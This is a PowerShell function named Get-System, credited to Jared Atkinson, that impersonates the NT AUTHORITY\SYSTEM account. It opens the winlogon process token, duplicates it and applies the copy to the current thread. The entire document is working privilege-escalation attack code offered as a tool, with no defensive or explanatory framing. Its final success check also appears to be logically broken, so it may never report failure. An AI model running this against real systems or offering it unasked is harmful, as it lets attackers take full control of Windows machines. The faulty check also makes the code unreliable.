function Get-System
{
    <#
    .SYNOPSIS

    Impersonate the NT AUTHORITY\SYSTEM account's token.

    .DESCRIPTION

    .NOTES

    Author: Jared Atkinson (@jaredcatkinson)
    License: 
    Required Dependencies: None
    Optional Dependencies: None

    .EXAMPLE

    Get-System
    #>

    # Get a Process object for the winlogon process
    # The System.Diagnostics.Process class has a handle property that we can use
    # We know winlogon will be available and is running as NT AUTHORITY\SYSTEM
    $proc = (Get-Process -Name winlogon)[0]

    # Open winlogon's Token with TOKEN_DUPLICATE Acess
    # This allows us to make a copy of the token with DuplicateToken
    $hToken = OpenProcessToken -ProcessHandle $proc.Handle -DesiredAccess $TOKEN_ACCESS::TOKEN_DUPLICATE
    
    # Make a copy of the NT AUTHORITY\SYSTEM Token
    $hDupToken = DuplicateToken -TokenHandle $hToken
    
    # Apply our Duplicated Token to our Thread
    ImpersonateLoggedOnUser -TokenHandle $hDupToken
    
    # Clean up the handles we created
    CloseHandle -Handle $hToken
    CloseHandle -Handle $hDupToken

    if(-not [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM')
    {
        throw "Unable to Impersonate System Token"
    }
}